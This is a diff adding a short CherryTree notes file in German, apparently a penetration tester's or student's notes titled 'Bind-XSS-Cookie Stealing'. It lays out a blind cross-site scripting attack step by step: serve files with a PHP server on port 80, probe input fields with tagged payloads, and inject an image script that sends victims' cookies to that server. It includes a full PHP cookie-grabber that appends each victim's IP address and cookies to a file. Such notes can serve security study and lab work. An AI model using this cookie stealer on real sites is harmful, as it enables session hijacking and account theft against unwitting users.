@@ -1,0 +1,40 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<cherrytree>
+  <node unique_id="14" master_id="0" name="Bind-XSS-Cookie Stealing" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1747131910" ts_lastsave="1747134819">
+    <rich_text>$cd /tmp/tmpserver&#13;
+$ sudo php -S 0.0.0.0:80
+
+Herausfinden welches Feld vulnerable ist:
+Verschiedene Payloads einfüggen und identifier einfügen -&gt; am get request sieht man dann welches es war.
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+Php code for cookie grabbing. einfügen. in index.php&#13;
+</rich_text>
+    <rich_text justification="left"></rich_text>
+    <rich_text>
+
+Server Starten.
+
+Ins XSS Vulnerable field jetzt mit local ip+port und der vulnerability das new image script für cookie einfügen:
+
+
+
+</rich_text>
+    <encoded_png char_offset="193" justification="left" link="" sha256sum="e48cbc1d76ad4718b82b20170add36b2b96984bcf501fe52eb5e08944a6955bd"/>
+    <codebox char_offset="250" justification="left" frame_width="977" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
+&lt;?php&#13;
+if (isset($_GET['c'])) {&#13;
+    $list = explode(";", $_GET['c']);&#13;
+    foreach ($list as $key =&gt; $value) {&#13;
+        $cookie = urldecode($value);&#13;
+        $file = fopen("cookies.txt", "a+");&#13;
+        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");&#13;
+        fclose($file);&#13;
+    }&#13;
+}&#13;
+?&gt;</codebox>
+    <encoded_png char_offset="383" justification="left" link="" sha256sum="72f88b02fb435d2fc7cb9453e8d40fa9a8a8354dd4f4ff42b94642c4efb0f399"/>
+  </node>
+</cherrytree>
